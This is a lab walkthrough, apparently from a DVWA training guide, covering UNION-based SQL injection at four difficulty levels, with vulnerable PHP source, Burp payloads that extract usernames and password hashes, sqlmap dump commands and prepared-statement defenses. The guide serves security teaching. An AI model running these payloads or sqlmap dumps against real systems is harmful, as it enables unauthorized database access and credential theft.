# Chapter 07 — SQL Injection (DVWA Module: SQL Injection)

## Objective
Extract the entire `users` table (usernames + password hashes) via classic UNION-based SQL injection, using Burp Repeater/Intruder, then automate with `sqlmap`.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#`

---

## 🟢 LOW

### Source logic
```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```
Directly concatenates user input into the SQL string — classic injection point.

### Burp Suite steps
1. Capture `GET /vulnerabilities/sqli/?id=1&Submit=Submit#`, send to Repeater.
2. **Confirm injection**:
   ```
   id=1' OR '1'='1
   id=1'--
   id=1' AND '1'='2
   ```
3. **Determine column count** (needed for UNION):
   ```
   id=1' ORDER BY 1--
   id=1' ORDER BY 2--
   id=1' ORDER BY 3--   → error: Unknown column '3' → confirms 2 columns
   ```
4. **UNION-based extraction**:
   ```
   id=1' UNION SELECT NULL,NULL--
   id=-1' UNION SELECT database(),version()--
   id=-1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
   id=-1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
   id=-1' UNION SELECT user,password FROM users--
   ```
5. Response body reflects `First name / Surname` fields — the injected columns appear there, revealing usernames and MD5 password hashes.

### sqlmap automation
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<sessid>; security=low" \
  --dbs

sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<sessid>; security=low" \
  -D dvwa -T users --dump
```

### Why it works
User input is inserted directly into the SQL query string with only surrounding single quotes, which the attacker's own `'` character can prematurely close, letting arbitrary SQL follow.

---

## 🟡 MEDIUM

### Source logic
```php
$id = $_REQUEST[ 'id' ];
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
```
Also, the input field becomes a **dropdown `<select>`** in the UI (not free text) — but the underlying parameter is still a normal POST field an attacker can edit directly.

### Burp Suite bypass
1. Since the field is now a dropdown, use Burp to intercept the POST and directly edit the `id` value (bypassing HTML `<select>` restriction entirely — client-side controls never limit what Burp can send):
   ```
   id=1 UNION SELECT user, password FROM users-- -
   ```
2. Note: **no quotes needed** here because `mysqli_real_escape_string()` only neutralizes quote characters; this injection point in DVWA Medium is **numeric context**, so quote-based escaping is irrelevant — you can inject directly without any `'`.

### Why the bypass works
`mysqli_real_escape_string()` protects against **quote-breaking** injection but does nothing for **numeric-context** injection, where no quotes are needed at all. The "fix" targeted the wrong threat model — client-side dropdown restriction is trivially bypassed via Burp since it's not a server-side control either.

---

## 🔴 HIGH

### Source logic
```php
$id = $_SESSION['id'];  // value must come via a SESSION var set earlier, injected via a different page flow (id param in URL not directly used)
```
Actually DVWA High wraps input through a slightly different flow (uses a hidden/session value plus a page redirect) but is **still vulnerable to the same UNION injection** — the extra step is meant to add friction, not real sanitization.

### Burp Suite exercise
1. Follow the multi-step flow: `sqli/session-input.php` sets `$_SESSION['id']`, then `sqli/` uses it.
2. Intercept the request that sets `$_SESSION['id']` and inject there instead:
   ```
   id=1' UNION SELECT user, password FROM users-- -
   ```
3. Confirm the same UNION technique succeeds once you find the actual point where raw input reaches the query — proving that moving the injection point without real parameterization changes nothing.

### Why it's still risky
Adding process/flow complexity (multi-step forms, session indirection) is **security by obscurity** — it doesn't remove the underlying string-concatenation flaw, it just requires the attacker to locate the real sink.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
$id = $_GET[ 'id' ];
$stmt = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
$stmt->bindParam( ':id', $id, PDO::PARAM_INT );
$stmt->execute();
```
**Parameterized query (prepared statement)** with typed binding (`PARAM_INT`). Also includes a CSRF token.

### Why the attack fails
User input is never concatenated into the SQL string — it's passed as a **bound parameter**, which the database driver treats strictly as *data*, never as executable SQL syntax, regardless of quotes, UNION keywords, or comment sequences.

### Burp Suite exercise
Replay every prior payload — all either return no results or a benign type-cast error (e.g., `'1 UNION SELECT...'` cast to an integer becomes just `1`), proving no SQL syntax injection is possible.

---

## Root Cause Analysis
SQL Injection results from mixing **code and data** in the same string via concatenation. Escaping functions (`real_escape_string`) only address the quote-breaking sub-case and fail for numeric/unquoted contexts. Only parameterized queries structurally separate code from data at the driver level, eliminating the vulnerability class entirely.

## Defensive Takeaways
- Always use prepared statements / parameterized queries (PDO, mysqli with bound params, ORM query builders).
- Never trust client-side field restrictions (dropdowns, hidden fields) as a security control.
- Apply least-privilege DB accounts (the web app's DB user shouldn't have `FILE`, `DROP`, or admin grants).
- Use a WAF as defense-in-depth, not as the primary control.

---
⬅ [Back: Insecure CAPTCHA](06-insecure-captcha.md) | ➡ [Next: Blind SQL Injection](08-sql-injection-blind.md)
